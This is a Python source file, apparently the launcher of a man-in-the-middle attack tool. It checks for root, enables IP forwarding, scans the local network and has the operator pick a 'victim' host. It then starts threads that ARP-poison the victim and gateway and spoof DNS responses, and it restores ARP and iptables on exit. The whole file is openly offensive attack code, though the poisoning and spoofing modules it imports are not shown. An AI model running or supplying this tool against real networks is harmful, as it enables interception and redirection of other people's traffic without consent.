from net import Net
from netdiscover import Discover
from dns import Dns
from arp import Arp
from banner import Banner
import colors

import os
import threading
import sys
import time


if __name__ == '__main__':
    try:
        # Do root or reboot!
        if os.geteuid() != 0:
            exit(
                colors.RED + "[!] Root privileges needed to run this script" + colors.DEFAULT)

        # Everyone loves banners
        b = Banner()
        b.show()
        net = Net()
        net.enable_forward()

        print(colors.WHITE +
              "[*] Available network interfaces:\n" + colors.DEFAULT)
        count = 0
        for x in net.get_avail_interfaces():
            print("\t" + str(count) + ") " + x)
            count += 1

        ans = ""
        while not ans.strip().isdigit() or int(ans.strip()) > count:
            ans = input(colors.BLUE + "\nmitm" + colors.WHITE + ":" +
                        colors.BLUE + "interface" + colors.WHITE + "> " + colors.DEFAULT)
        inter = net.get_avail_interfaces()[int(ans)]
        net.set_interface(inter)

        print(colors.WHITE + "\n[*] Available hosts:\n" + colors.DEFAULT)
        discover = Discover()
        discover.discover(net.get_attacker_ip(), net.get_net_mask())
        net.set_victim_ip(discover.select_host())

        print("\n\t{:20} {:<10}".format(
            "[*] Interface:", colors.GREEN + net.get_interface() + colors.DEFAULT))
        print("\t{:20} {:<10}".format(
            "[*] Attacker IP:", colors.GREEN + net.get_attacker_ip() + colors.DEFAULT))
        print("\t{:20} {:<10}".format(
            "[*] Gateway IP:", colors.GREEN + net.get_gateway_ip() + colors.DEFAULT))
        print("\t{:20} {:<10}".format(
            "[*] Victim IP:", colors.GREEN + net.get_victim_ip() + colors.DEFAULT))

    except KeyboardInterrupt:
        print("\r")
        print(colors.RED + "\n[!] Quitting.." + colors.DEFAULT)
        sys.exit(0)

    try:
        # ARP poison
        arp = Arp(net.get_gateway_ip(),
                  net.get_victim_ip(), net.get_interface())
        arp.setup_mac()

        # DNS spoofing
        dns = Dns(net.get_attacker_ip())

        # Let's start thread of both
        print(colors.WHITE + "\n[*] Starting ARP poisoning.." + colors.DEFAULT)
        poisonThread = threading.Thread(target=arp.poison)
        print(colors.WHITE + '[*] Spoofing DNS responses...' + colors.DEFAULT)
        dnsThread = threading.Thread(target=dns.spoof)

        poisonThread.daemon = True
        dnsThread.daemon = True

    except KeyboardInterrupt:
        print("\r")
        print(colors.RED + "\n[!] Quitting.." + colors.DEFAULT)
        sys.exit(0)

    poisonThread.start()
    dnsThread.start()

    while True:
        try:
            pass
        except KeyboardInterrupt:
            print("\r")
            print(colors.RED + "[*] Quitting.." + colors.DEFAULT)
            arp.re_arp()
            time.sleep(2)
            print(colors.WHITE + "[*] Restoring iptables.." + colors.DEFAULT)
            dns.restore_iptables()
            time.sleep(2)
            print(colors.YELLOW +
                  "\nGoodbye horses..  I'm flying over you.. ♥" + colors.DEFAULT)
            sys.exit(0)
